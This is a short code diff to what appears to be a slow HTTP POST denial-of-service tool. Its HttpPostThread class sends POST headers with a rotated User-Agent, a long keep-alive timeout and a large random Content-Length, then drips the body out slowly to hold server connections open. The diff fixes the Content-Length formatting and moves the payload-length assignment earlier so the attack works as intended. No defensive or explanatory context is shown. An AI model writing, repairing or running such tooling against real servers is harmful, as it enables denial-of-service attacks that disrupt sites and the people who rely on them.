@@ -54,13 +54,14 @@ class HttpPostThread(Thread):
     def _send_http_post(self):
         global stop_now
 
+        payload_length = random.randint(5000, 10000)
         headers_list = [
             f'POST {self.path} HTTP/1.1',
             f'Host: {self.host}',
             f'User-Agent: {random.choice(useragents)}',
             'Connection: keep-alive',
             'Keep-Alive: timeout=900, max=1000',
-            'Content-Length: {payload_length}',
+            f'Content-Length: {payload_length}',
             'Content-Type: application/x-www-form-urlencoded',
         ]
         headers = '\r\n'.join(headers_list)
@@ -68,7 +69,6 @@ class HttpPostThread(Thread):
         self.transport.send(b'\r\n\r\n')
         self._log(f'Sent headers:\n{headers}\n')
 
-        payload_length = random.randint(5000, 10000)
         for i in range(0, payload_length - 1):
             if stop_now:
                 self.running = False
